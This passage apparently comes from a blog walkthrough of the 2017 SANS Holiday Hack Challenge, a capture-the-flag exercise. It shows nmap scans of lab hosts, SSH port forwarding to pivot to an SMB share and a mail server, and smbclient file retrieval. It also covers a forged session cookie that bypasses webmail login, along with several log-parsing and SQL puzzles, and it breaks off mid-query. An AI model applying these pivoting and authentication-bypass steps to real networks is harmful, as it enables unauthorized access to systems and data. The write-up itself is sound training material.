SF:\x02\x01\x07e\x07\n\x01\0\x04\0\x04\0")%r(LDAPBindReq,25,"0#\x02\x01\x0
SF:1a\x1e\n\x01\x02\x04\0\x04\x17Version\x202\x20not\x20supported");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Host is up (0.0038s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE            VERSION
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ssl/ms-wbt-server?
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
Host is up (0.00013s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 10.0
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ssl/ms-wbt-server?
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Host is up (0.00017s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
80/tcp open  http    nginx 1.10.3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
Host is up (0.0041s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 10.0
3389/tcp open  ssl/ms-wbt-server?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (7 hosts up) scanned in 88.63 seconds
```

After the Nmap scan has completed, we can see that the IP of __10.142.0.7__ is a Windows Server 2008 R2 - 2012 running SMB Server on TCP/445.

```console
Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Host is up (0.0038s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE            VERSION
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ssl/ms-wbt-server?
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

Great, now that we know where the SMB Server is, we will have to enumerate it and see what shares are open.

To do so, we will have to do some port forwarding via SSH - this will allow us to directly access the SMB Server from our Kali Machine by using our SSH access to the Letters to Santa server.

Holly actually provides us a good hint on [SSH Port Forwarding](https://help.ubuntu.com/community/SSH/OpenSSH/PortForwarding).

<a href="https://jhalon.github.io/images/shh22.png"><img src="https://jhalon.github.io/images/shh22.png"></a>

Alright, so let's go ahead and forward TCP/445 to the SMB Server via the following command.

```console
root@kali:~/HH# ssh -L 445:10.142.0.7:445 alabaster_snowball@35.190.140.65
alabaster_snowball@35.190.140.65's password: 
alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.Tkb7IbWTBHKIajNrcEe9uzJr$ 
```

Once that's done, let’s verify if we indeed have a valid tunnel via SMB by running an Nmap scan against our localhost and TCP/445.

```console
root@kali:~# nmap -sV -p 445 localhost

Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-28 16:57 CST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000058s latency).
Other addresses for localhost (not scanned): ::1

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
```

The SSH tunnel works, and we have successfully forwarded our SMB port to the Internal Christmas Town SMB file-share server.

From here, we can run `smbclient` against our localhost while utilizing Alabaster's username and password to list all the share's on the server.

```console
root@kali:~# smbclient -L localhost -U alabaster_snowball
WARNING: The "syslog" option is deprecated
Enter alabaster_snowball's password: 
Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]

       Sharename       Type      Comment
       ---------       ----      -------
       ADMIN$          Disk      Remote Admin
       C$              Disk      Default share
       FileStor        Disk      
       IPC$            IPC       Remote IPC
Connection to localhost failed (Error NT_STATUS_CONNECTION_REFUSED)
NetBIOS over TCP disabled -- no workgroup available
```

The __FileStor__ share looks interesting, so let's go ahead and connect to it to see what's inside.

```console
root@kali:~# smbclient \\\\localhost\\FileStor -U alabaster_snowball
WARNING: The "syslog" option is deprecated
Enter alabaster_snowball's password: 
Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]
smb: \> ls
  .                                   D        0  Thu Dec 28 00:35:38 2017
  ..                                  D        0  Thu Dec 28 00:35:38 2017
  BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 15:44:17 2017
  GreatBookPage3.pdf                  A  1275756  Mon Dec  4 13:21:44 2017
  MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 15:47:28 2017
  Naughty and Nice List.csv           A    10245  Thu Nov 30 13:42:00 2017
  Naughty and Nice List.docx          A    60344  Wed Dec  6 15:51:25 2017

              13106687 blocks of size 4096. 9623619 blocks available
smb: \> 
```

Awesome, we found the 3rd Page of the Great Book! We can simply run the `get` command via SMB to download the file to our Kali machine.

<a href="https://jhalon.github.io/images/shh23.png"><img src="https://jhalon.github.io/images/shh23.png"></a>

I also see that there are more files on the file share, so let's go ahead and download them all, just in case we might need them later.

```console
mb: \> get "BOLO - Munchkin Mole Report.docx"
getting file \BOLO - Munchkin Mole Report.docx of size 255520 as BOLO - Munchkin Mole Report.docx (725.4 KiloBytes/sec) (average 1790.9 KiloBytes/sec)
smb: \> get "MEMO - Password Policy Reminder.docx"
getting file \MEMO - Password Policy Reminder.docx of size 133295 as MEMO - Password Policy Reminder.docx (189.8 KiloBytes/sec) (average 1068.7 KiloBytes/sec)
smb: \> get "Naughty and Nice List.csv"
getting file \Naughty and Nice List.csv of size 10245 as Naughty and Nice List.csv (57.8 KiloBytes/sec) (average 965.5 KiloBytes/sec)
smb: \> get "Naughty and Nice List.docx"
getting file \Naughty and Nice List.docx of size 60344 as Naughty and Nice List.docx (193.2 KiloBytes/sec) (average 847.7 KiloBytes/sec)
```

## The Great Book: Page 4

### North Pole and Beyond - There's Snow Place Like Home

#### Terminal Challange:

Upon accessing the CranPI Terminal, we are presented with the following:

```console
                          .-"""".._'.       _,##
                   _..__ |.-"""-.|  |   _,##'`-._
                  (_____)||_____||  |_,##'`-._,##'`
                  _|   |.;-""-.  |  |#'`-._,##'`
               _.;_ `--' `\    \ |.'`\._,##'`
              /.-.\ `\     |.-";.`_, |##'`
              |\__/   | _..;__  |'-' /
              '.____.'_.-`)\--' /'-'`
               //||\\(_.-'_,'-'`
             (`-...-')_,##'`
      jgs _,##`-..,-;##`
       _,##'`-._,##'`
    _,##'`-._,##'`
      `-._,##'`
My name is Pepper Minstix, and I need your help with my plight.
I've crashed the Christmas toy train, for which I am quite contrite.
I should not have interfered, hacking it was foolish in hindsight.
If you can get it running again, I will reward you with a gift of delight.
total 444
-rwxr-xr-x 1 root root 454636 Dec  7 18:43 trainstartup

elf@cc84e306095a:~$
```

From the gist of it, we need to run the __trainstartup__ binary. It seems like this is the "norm" for most of the challenges. So let's list our current working directory and see if we can't find the binary we need.

```console
elf@cc84e306095a:~$ ls -la
total 464
drwxr-xr-x 1 elf  elf    4096 Dec  7 18:43 .
drwxr-xr-x 1 root root   4096 Dec  6 20:01 ..
-rw-r--r-- 1 elf  elf     220 Apr  9  2014 .bash_logout
-rw-r--r-- 1 root root   3884 Dec  4 14:28 .bashrc
-rw-r--r-- 1 elf  elf     675 Apr  9  2014 .profile
-rwxr-xr-x 1 root root 454636 Dec  7 18:43 trainstartup
```

Okay, so the __trainstartup__ binary is in our home directory, let's see what happens when we try to execute it.

```console
elf@cc84e306095a:~$ ./trainstartup 
bash: ./trainstartup: cannot execute binary file: Exec format error
```

Hmmm... Interesting. Looking at the error, we see that there is a format error while trying to execute the binary. Let's check what kind of executable this is.

```console
elf@cc84e306095a:~$ file trainstartup 
trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
```

Okay, no wonder we can't execute the file - it's in ARM format! 

If we actually look at Holly's Twitter account, we can see a tweet that mentions using [qemu]()

After doing some research via Google, I came across the following post in Stack Overflow on how [qemu-arm can't run arm compiled binary's](https://stackoverflow.com/questions/16158994/qemu-arm-cant-run-arm-compiled-binary). 

After reading the post, we learn that we can execute the binary with qemu by utilizing the following command.

```console
elf@cc84e306095a:~$ qemu-arm trainstartup 
Starting up ... 



    Merry Christmas
    Merry Christmas
v
>*<
^
/o\
/   \               @.·
/~~   \                .
/ ° ~~  \         · .    
/      ~~ \       ◆  ·    
/     °   ~~\    ·     0
/~~           \   .─··─ · o
             /°  ~~  .*· · . \  ├──┼──┤                                        
              │  ──┬─°─┬─°─°─°─ └──┴──┘                                        
≠==≠==≠==≠==──┼──=≠     ≠=≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠===≠
              │   /└───┘\┌───┐       ┌┐                                        
                         └───┘    /▒▒▒▒                                        
≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠=°≠=°≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠
You did it! Thank you!
```

Once you complete the challenge you will unlock a new tool that will help you navigate the snowball toward the end of the level. Once you get the snowball to the end, you will unlock more hints for future challenges.

<a href="https://jhalon.github.io/images/shh24.png"><img src="https://jhalon.github.io/images/shh24.png"></a>

<a href="https://jhalon.github.io/images/shh25.png"><img src="https://jhalon.github.io/images/shh25.png"></a>

### North Pole Christmas Town Infrastructure

#### Elf Web Access (EWA):

For this portion we know that Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com.

What we need to do is find the next _Great Book_ page, which is located somewhere on the mail server.

If we look back to our internal Nmap scan, we will notice that __10.142.0.5__ hosts the EWA Server.

```console
Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Host is up (0.00016s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp    Postfix smtpd
80/tcp   open  http    nginx 1.10.3 (Ubuntu)
143/tcp  open  imap    Dovecot imapd
2525/tcp open  smtp    Postfix smtpd
3000/tcp open  http    Node.js Express framework
Service Info: Host:  mail.northpolechristmastown.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Okay, so now we need to establish a connection to the EWA server. So what we will do is we will port forward TCP/8050 from our localhost to TCP/80 on the EWA server, and then configure our Web Browser Proxy to listen to 8050 on our localhost.

We can configure the SSH Port Forwarding with the following command:

```console
root@kali:~/HH# ssh -L 8050:10.142.0.5:80 alabaster_snowball@35.190.140.65
alabaster_snowball@35.190.140.65's password: 
alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.anntDS9kgZfLYSCN2iFa2GML$
```

And then let's configure the proxy...

<a href="https://jhalon.github.io/images/shh26.png"><img src="https://jhalon.github.io/images/shh26.png"></a>

Once that's done, we can navigate to __10.142.0.5__ in our browser and we will be presented with the following login page for the EWA Server.

<a href="https://jhalon.github.io/images/shh27.png"><img src="https://jhalon.github.io/images/shh27.png"></a>

If we actually take a look at the hints provided by Pepper Minstix, we learn that Alabaster created his own Encryption Scheme for the Session Cookies, and also get a hint about editing cookies as well. 

<a href="https://jhalon.github.io/images/shh28.png"><img src="https://jhalon.github.io/images/shh28.png"></a>

First of all, let's use [Cookie Manager +](https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/) in FireFox to view out EWA cookie.

<a href="https://jhalon.github.io/images/shh29.png"><img src="https://jhalon.github.io/images/shh29.png"></a>

After reading those hints and seeing the cookie, we come to understand that our ultimate goal is to get the plaintext to equal the ciphertext.

The process used is the following:
1) Secret key is used with AES256 and first 16 bytes as initialization vector.
2) This output is base64 encoded, and then stripped of any padding (the extra =s)

By using 16 null bytes, the plaintext is encrypted as the key itself +AES256 encryption because anything XORed with 0 is itself. This result is then base64 encoded and stripped of the =s.

So how are 16 null bytes represented? As 32 0s, because a null byte is 0x00. 

So the command `echo 00000(whatever to 32)00 | xxd -r -p` converts the hex representation of 16 null bytes into ASCII null bytes. 

The base64 encoding of the null bytes gives us the string of As with the padding to make it fit into the 4 byte block

So to accomplish this, we simply add Alabaster's Email as his name, leave the plaintext blank, and include 21 "A"'s as the Ciphertext.

<a href="https://jhalon.github.io/images/shh30.png"><img src="https://jhalon.github.io/images/shh30.png"></a>

This should initialy give us a valid cookie and allow us to bypass the login and access's alabster's email. So let's submit the cookie, and refresh the page.

<a href="https://jhalon.github.io/images/shh31.png"><img src="https://jhalon.github.io/images/shh31.png"></a>

Awesome, it worked! We got access to Alabasters Email Account!

Digging through the email we come across a few emails that might help us in the future - including one about a Ginger Bread Recepie, and one about a DDE Attack Vector.

<a href="https://jhalon.github.io/images/shh32.png"><img src="https://jhalon.github.io/images/shh32.png"></a>

<a href="https://jhalon.github.io/images/shh33.png"><img src="https://jhalon.github.io/images/shh33.png"></a>

<a href="https://jhalon.github.io/images/shh34.png"><img src="https://jhalon.github.io/images/shh34.png"></a>

At the same time, we learn that Alabaster lovers powershell, but also has netcat installed... hmmm.

<a href="https://jhalon.github.io/images/shh35.png"><img src="https://jhalon.github.io/images/shh35.png"></a>

Toward the end of the page, we see an email with a link to the 4th page of the Great Book.

<a href="https://jhalon.github.io/images/shh36.png"><img src="https://jhalon.github.io/images/shh36.png"></a>

Accessing that link allows us to read the 4th Page.

<a href="https://jhalon.github.io/images/shh37.png"><img src="https://jhalon.github.io/images/shh37.png"></a>

## The Great Book: Page 5

### North Pole and Beyond - Bumbles Bounce

#### Terminal Challenge:

Upon accessing the CranberryPI Terminal, we are presented with the following:

```console
                           ._    _.
                           (_)  (_)                  <> \  / <>
                            .\::/.                   \_\/  \/_/ 
           .:.          _.=._\\//_.=._                  \\//
      ..   \o/   ..      '=' //\\ '='             _<>_\_\<>/_/_<>_
      :o|   |   |o:         '/::\'                 <> / /<>\ \ <>
       ~ '. ' .' ~         (_)  (_)      _    _       _ //\\ _
           >O<             '      '     /_/  \_\     / /\  /\ \
       _ .' . '. _                        \\//       <> /  \ <>
      :o|   |   |o:                   /\_\\><//_/\
      ''   /o\   ''     '.|  |.'      \/ //><\\ \/
           ':'        . ~~\  /~~ .       _//\\_
jgs                   _\_._\/_._/_      \_\  /_/ 
                       / ' /\ ' \                   \o/
       o              ' __/  \__ '              _o/.:|:.\o_
  o    :    o         ' .'|  |'.                  .\:|:/.
    '.\'/.'                 .                 -=>>::>o<::<<=-
    :->@<-:                 :                   _ '/:|:\' _
    .'/.\'.           '.___/*\___.'              o\':|:'/o 
  o    :    o           \* \ / */                   /o\
       o                 >--X--<
                        /*_/ \_*\
                      .'   \*/   '.
                            :
                            '
Minty Candycane here, I need your help straight away.
We're having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.
total 28704
-rw-r--r-- 1 root root 24191488 Dec  4 17:11 access.log
-rwxr-xr-x 1 root root  5197336 Dec 11 17:31 runtoanswer
elf@3ed4c4e99ab2:~$ 
```

Alright, so for this challenge it seems that we need to parse the access logs and identify the "least-popular" browser. 

Let's start off by seeing how the __access.log__ is structured by printing the first few lines of the file by using the [head]() command.

```console
elf@3ed4c4e99ab2:~$ head -n 10 access.log 
XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] "GET /robots.txt HTTP/1.1" 404 5 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
XX.YY.89.151 - - [19/Nov/2017:07:13:03 -0500] "GET /img/common/apple-touch-icon-57x57.png HTTP/1.1" 200 3677 "-" "Slack-ImgProxy (+https://api.slack.com/robots)"
XX.YY.66.201 - - [19/Nov/2017:07:22:12 -0500] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
XX.YY.45.77 - - [19/Nov/2017:07:43:08 -0500] "GET /img/common/apple-touch-icon-57x57.png HTTP/1.1" 200 3677 "-" "Slack-ImgProxy (+https://api.slack.com/robots)"
XX.YY.201.12 - - [19/Nov/2017:08:21:10 -0500] "GET /manager/html HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
XX.YY.218.124 - - [19/Nov/2017:08:22:09 -0500] "GET /img/common/favicon-128.png HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"
XX.YY.68.152 - - [19/Nov/2017:08:43:27 -0500] "GET /img/common/apple-touch-icon-57x57.png HTTP/1.1" 200 3677 "-" "Slack-ImgProxy (+https://api.slack.com/robots)"
XX.YY.236.170 - - [19/Nov/2017:08:48:39 -0500] "GET /img/common/apple-touch-icon-57x57.png HTTP/1.1" 200 3677 "-" "slack/2.47.0.7352 (motorola Moto G (4); Android 7.0)"
XX.YY.11.135 - - [19/Nov/2017:08:56:32 -0500] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0"
```

Okay, so each line in the log contains a User Agent for each GET request. After some time spent Googling, I came across a question in Stack Exchange on how to [get a list of user-agents from nginx logs](https://serverfault.com/questions/89773/get-list-of-user-agents-from-nginx-log).

After reading the answer, I utilize the provided command against __access.log__ to see if we indeed will have a list of user agents.

```console
elf@3ed4c4e99ab2:~$ awk -F '"' '/GET/ {print $6}' access.log | cut -d ' ' -f1 | sort | uniq -c | sort -rn
  96551 Mozilla/5.0
    422 Slack-ImgProxy
    353 Mozilla/4.0
     76 -
     34 Googlebot-Image/1.0
     25 ZmEu
     16 slack/2.47.1.7358
     13 slack/2.47.0.7352
     12 sysscan/1.0
     11 facebookexternalhit/1.1
     11 Wget(linux)
      8 ltx71
      8 Slack/370354
      7 Slack/370342
      4 slack/2.46.0.7100
      4 Python-urllib/2.7
      3 null
      3 Slack/370136
      3 Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0
      3 MobileSafari/604.1
      3 GarlikCrawler/1.2
      2 masscan/1.0
      2 WhatWeb/0.4.9
      2 WhatWeb/0.4.8-dev
      2 Twitterbot/1.0
      2 Twitter/7.11.1
      2 Telesphoreo
      2 Slackbot-LinkExpanding
      2 Slack/370007
      2 (KHTML,
      1 www.probethenet.com
      1 curl/7.35.0
      1 curl/7.19.7
      1 Dillo/3.0.5
```

Alright - it works! It seems that "__1 Dillo/3.0.5__" is the least used browser, so from here let's utilize the "__runtoanswer__" binary and provide our answer.

```console
elf@3ed4c4e99ab2:~$ ./runtoanswer 
Starting up, please wait......

Enter the name of the least popular browser in the web log: Dillo/3.0.5
That is the least common browser in the web log! Congratulations!
```

Once that's completed, you will receive a new tool that will help you navigate your snowball to the end of the level.

<a href="https://jhalon.github.io/images/shh38.png"><img src="https://jhalon.github.io/images/shh38.png"></a>

<a href="https://jhalon.github.io/images/shh39.png"><img src="https://jhalon.github.io/images/shh39.png"></a>

At the same time, the new tools will help you get the 5th page of the Great Book which can be found in the level.

<a href="https://jhalon.github.io/images/shh40.png"><img src="https://jhalon.github.io/images/shh40.png"></a>

<a href="https://jhalon.github.io/images/shh41.png"><img src="https://jhalon.github.io/images/shh41.png"></a>

### North Pole Christmas Town Infrastructure

#### North Pole Police Department (NPPD):

Upon accessing https://nppd.northpolechristmastown.com/ we are presented with the following website. 

<a href="https://jhalon.github.io/images/shh42.png"><img src="https://jhalon.github.io/images/shh42.png"></a>

From the looks of it, we can see Reports of Elf's who committed crimes along with their name and crime committed.

At the same time, it seems that we can search through the reports either by keywords or date. So to help us answer our questions, I opted to search for everything in the database before the date of __2017-12-30__.

<a href="https://jhalon.github.io/images/shh43.png"><img src="https://jhalon.github.io/images/shh43.png"></a>

Once we get the results, upon scrolling down we see that we can download a JSON file containing all the results.

<a href="https://jhalon.github.io/images/shh44.png"><img src="https://jhalon.github.io/images/shh44.png"></a>

Upon downloading the file, we can see that we have a query of all the results from the NPPD Database.

<a href="https://jhalon.github.io/images/shh45.png"><img src="https://jhalon.github.io/images/shh45.png"></a>

Now, if you remember back to when we downloaded the files from the SMB Server, we had a file called "__BOLO: Munchkin Mole Advisory__"

```
BOLO: Munchkin Mole Advisory
Please be advised that the long-rumored munchkin moles are now believed to be real. After a detailed and thorough investigation, North Pole Authorities have identified two munchkins impersonating elves in Santa's workshop.
When confronted, both munchkins were able to evade elf authorities after throwing rocks and engaging in aggravated hair pulling. The pair mysteriously disappeared after speaking an unknown word sounding like "puuurzgexgull."
Munchkin Descriptions
Name: Boq Questrian
Height: Approximately 4 feet
Weight: Unknown
Appearance: Reddish skin tone, blue eyes. A single curl of hair dominates an otherwise unremarkable hairstyle.
Warning: Boq is uncannily accurate at short-distance rock throwing.
Name: Bini Aru
Height: Approximately 4 feet
Weight: Unknown
Appearance: Pale skin, grey eyes. Unruly black hair.
Warning: Bini is unrelenting in hair pulling.
If you see these munchkin moles, do not attempt to detain or apprehend them. Contact the North Pole Police Department for assistance.
For more information visit https://nppd.northpolechristmastown.com.
Merry Christmas!
```

We also had a file titled the "__Naughty and Nice List.csv__" which had a list of names and if they were "Naughty" or "Nice".

```console
root@kali:~/HH# head Naughty\ and\ Nice\ List.csv 
Abdullah Lindsey,Nice
Abigail Chavez,Nice
Aditya Perera,Naughty
Adrian Kemp,Nice
Adrian Lo,Nice
Adriana Sutherland,Nice
Agnes Adam,Nice
Ahmed Hernandez,Nice
Al Molina,Nice
Alabaster Snowball,Nice
```

Looking at the reports we see the Moles did 3 crimes, Throwing Rocks and Hair Pulling. At the same time we see that there are two types of throwing rocks - at people, and at non-person targets.

<a href="https://jhalon.github.io/images/shh46.png"><img src="https://jhalon.github.io/images/shh46.png"></a>

To be able to answer our question and find the 6 moles, I created a python script.

```python
#!/usr/bin/python

import csv
import json
from operator import itemgetter
from collections import defaultdict

MOLE_INFR = set(['Aggravated pulling of hair', 'Throwing rocks (at people)', 'Throwing rocks (non-person target)'])

def get_naughty():
    with open("Naughty and Nice List.csv") as f:
        reader = csv.reader(f)
        rows = list(reader)

    return [name for (name, naughty) in rows if naughty == 'Naughty']

def main():
    infractions_dict = defaultdict(set)
    infractions_by_name = defaultdict(int)
    with open("infractions.json") as f:
        infractions_json = json.load(f)

    for i in infractions_json['infractions']:
        infractions_dict[i['name'].encode("utf-8")].add(i['title'].encode("utf-8"))
        infractions_by_name[i['name'].encode("utf-8")] += 1

    print "Insider Threat Moles:"
    for n, titles in infractions_dict.iteritems():
        if len(titles & MOLE_INFR) >= 2:
            print(n, ', '.join(titles))

    minimal_infractions = min(infractions_by_name[name] for name in get_naughty())

    print
    print "Infractions needed to be marked as Naughty: %s" % minimal_infractions

if __name__ == "__main__":
   main() 
```

Running the code, we get the following:

```console
oot@kali:~/HH# python infractions_search.py 
Insider Threat Moles:
('Nina Fitzgerald', 'Possession of unlicensed slingshot, Throwing rocks (at people), Bedtime violation, Giving super atomic wedgies, Aggravated pulling of hair')
('Beverly Khalil', 'Possession of unlicensed slingshot, General sassing, Playing with matches, Aggravated pulling of hair, Throwing rocks (at people)')
('Christy Srivastava', 'Tantrum in a private facility, Tantrum in public, Throwing rocks (non-person target), Aggravated pulling of hair')
('Kirsty Evans', 'Throwing rocks (at people), Giving super atomic wedgies, Aggravated pulling of hair, Crayon on walls')
('Isabel Mehta', 'Tantrum in a private facility, Throwing rocks (non-person target), Aggravated pulling of hair')
('Sheri Lewis', 'Possession of unlicensed slingshot, Throwing rocks (at people), Naughty words, Aggravated pulling of hair')

Infractions needed to be marked as Naughty: 4
```

## The Great Book: Page 6

### North Pole and Beyond - I Don’t Think We're In Kansas Anymore

#### Terminal Challenge:

Upon accessing the CranberryPI Terminal, we are presented with the following:

```console
                       *
                      .~'
                     O'~..
                    ~'O'~..
                   ~'O'~..~'
                  O'~..~'O'~.
                 .~'O'~..~'O'~
                ..~'O'~..~'O'~.
               .~'O'~..~'O'~..~'
              O'~..~'O'~..~'O'~..
             ~'O'~..~'O'~..~'O'~..
            ~'O'~..~'O'~..~'O'~..~'
           O'~..~'O'~..~'O'~..~'O'~.
          .~'O'~..~'O'~..~'O'~..~'O'~
         ..~'O'~..~'O'~..~'O'~..~'O'~.
        .~'O'~..~'O'~..~'O'~..~'O'~..~'
       O'~..~'O'~..~'O'~..~'O'~..~'O'~..
      ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
     ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
   .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
  ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
 .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
Sugarplum Mary is in a tizzy, we hope you can assist.
Christmas songs abound, with many likes in our midst.
The database is populated, ready for you to address.
Identify the song whose popularity is the best.
total 20684
-rw-r--r-- 1 root root 15982592 Nov 29 19:28 christmassongs.db
-rwxr-xr-x 1 root root  5197352 Dec  7 15:10 runtoanswer
elf@3f31d4a83638:~$ 
```

So it seems that we need to find the most popular Christmas song from a SQL Database. If we take a look at Mary’s Twitter we see a tweet asking for help with a GROUP BY statements.
Further down we also see a comment that points to an awesome post from SANS – [Your Pokemon Guide for Essential SQL Pen Test Commands](https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands).

After reading the post we learn some basic SQL commands that we can utilize in __sqllite3__.  So, with that knew knowledge in hand, let’s open up the __christmassongs.db__ file with sqllite3, and run the `.schema;` command to see the tables, and what items are contained in each table.

```console
elf@3f31d4a83638:~$ sqlite3 christmassongs.db 
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
sqlite> .schema
CREATE TABLE songs(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  title TEXT,
  artist TEXT,
  year TEXT,
  notes TEXT
);
CREATE TABLE likes(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  like INTEGER,
  datetime INTEGER,
  songid INTEGER,
  FOREIGN KEY(songid) REFERENCES songs(id)
);
```

Awesome, so we now know what kind of data is contained in each table, along with the name of the rows in the tables.

Let’s go ahead and select the first 5 rows of data from the Songs table to see how the information looks like by running the following command:

```console
sqlite> SELECT * FROM SONGS
   ...> LIMIT 5;
1|A' Soalin'|Peter, Paul & Mary|1963|From the album Moving. Written by Paul Stookey, Tracy Batteste & Elaina Mezzetti. Contains an element of "God Rest Ye Merry, Gentlemen".
2|Adeste Fideles (O Come, All Ye Faithful)|Associated Glee Clubs of America|1925|Peaked at No. 5 on the pop singles chart in 1925. This historic record was the first electrically recorded disc to create a popular imp
act, and featured the largest choir popular music has ever known: some 4,800 voices (according to Columbia Records). Bing Crosby also charted with a version of the traditional hymn, which peaked at No. 45 on the Bill
board Hot 100 singles chart in December 1960. Over 150 versions of this standard have appeared in Christmas LPs since 1946.
3|All Alone on Christmas|Darlene Love|1992|Peaked at No. 83 on the Billboard Hot 100 singles chart in January 1993. From the 1992 film Home Alone 2: Lost in New York.
4|All I Really Want for Christmas|Steven Curtis Chapman|2005|Peaked at No. 2 on the Billboard Christian Songs chart in January 2006.
5|All I Want for Christmas Is a Real Good Tan|Kenny Chesney|2003|Peaked at No. 30 on Billboard's Hot Country Singles & Tracks chart in December 2003.
```

Okay, so it seems we got the ID, Title, Artist, etc. just as it was displayed in the schema, Let’s also get the first 5 rows of data from the Likes table to see how that looks like.

```console
sqlite> SELECT * FROM LIKES
   ...> LIMIT 5;
1|1|1487102189|250
2|1|1504354018|119
3|1|1510169870|283
4|1|1483240748|82
5|1|1497771899|238
```

So we have the table ID, a like, date and time, and a songid which is configured as a [FOREIGN KEY](https://www.w3schools.com/sql/sql_foreignkey.asp) to the ID in the Songs table. Simply a FOREIGN KEY is a key used to link two tables together

So for us to be able to get the data we need, what we will have to do is select the Song Title, the total sum or “count” of the Song ID from the Likes Table, and then we will need to join that data with our KEYS so that they match the SONG ID in the Likes table to the SONG ID in the Songs table.

This way we can pull other data from the Songs table such as the Song Title. After that we will sort the data in DESCENDING to get the most popular first, and limit that to only 10 results.

We can do that with the following SQL Query:

```console
sqlite> SELECT sg.title, count(lk.songid) FROM likes lk
   ...> LEFT JOIN songs sg on sg.id=lk.songid
